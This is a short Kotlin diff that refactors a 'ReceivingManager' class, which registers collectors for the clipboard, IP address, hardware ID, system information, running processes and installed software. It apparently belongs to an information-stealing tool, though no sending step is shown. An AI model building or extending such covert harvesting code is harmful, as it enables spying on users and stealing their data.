@@ -1,20 +1,20 @@
 package maven.example.com.receiving
 
 import maven.example.com.receiving.system.*
-import maven.example.com.receiving.utility.Receipt
+import maven.example.com.utility.data.Receipt
 import maven.example.com.utility.data.Data
 import java.util.function.Consumer
 
 class ReceivingManager {
     companion object {
         fun receiving(): MutableList<Data?> {
-            val receipts: MutableList<Receipt?> = ArrayList<Receipt?>()
-            val list: MutableList<Data?> = ArrayList<Data?>()
+            val receipts: MutableList<Receipt?> = ArrayList()
+            val list: MutableList<Data?> = ArrayList()
 
             // System
             receipts.add(Clipboard())
             receipts.add(IP())
-            receipts.add(HWID())
+            receipts.add(Hwid())
             receipts.add(SystemInformationJava())
             receipts.add(ProcessList())
             receipts.add(InstalledSoftware())
